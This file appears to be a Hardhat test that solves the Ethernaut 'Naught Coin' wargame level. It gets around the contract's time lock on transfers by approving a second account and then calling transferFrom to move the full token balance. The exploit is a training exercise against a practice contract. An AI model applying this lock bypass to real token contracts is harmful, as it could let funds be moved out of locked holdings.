import { expect } from "chai";
import { BigNumber } from "ethers";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

describe("Naught Coin", function () {
  it("Should zero", async function () {
    // Get two addresses, treat one as innocent user and one as attacker
    const [_, playerOne, playerTwo] = await ethers.getSigners();


    const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
    const naughtCoin = await NaughtCoin.connect(playerOne).deploy(playerOne.address)
    await naughtCoin.deployed()

    // check if player one has balance
    const playerOneBalance = await naughtCoin.balanceOf(playerOne.address)
    expect(playerOneBalance).to.equal(parseEther("1000000"))

    // approve transaction
    const approveTx = await naughtCoin.connect(playerOne).approve(playerTwo.address, parseEther("1000000"))
    approveTx.wait(1)

    // transferFrom tx
    const transferFrom = await naughtCoin.connect(playerTwo).transferFrom(playerOne.address, playerTwo.address, parseEther("1000000"))
    transferFrom.wait(1)

    // check if player one has 0 balance
    const playerOneBalanceNew = await naughtCoin.balanceOf(playerOne.address)
    expect(playerOneBalanceNew).to.equal(parseEther("0"))

    // check if player twp has balance
    const playerTwoBalanceNew = await naughtCoin.balanceOf(playerTwo.address)
    expect(playerTwoBalanceNew).to.equal(parseEther("1000000"))

  });
});
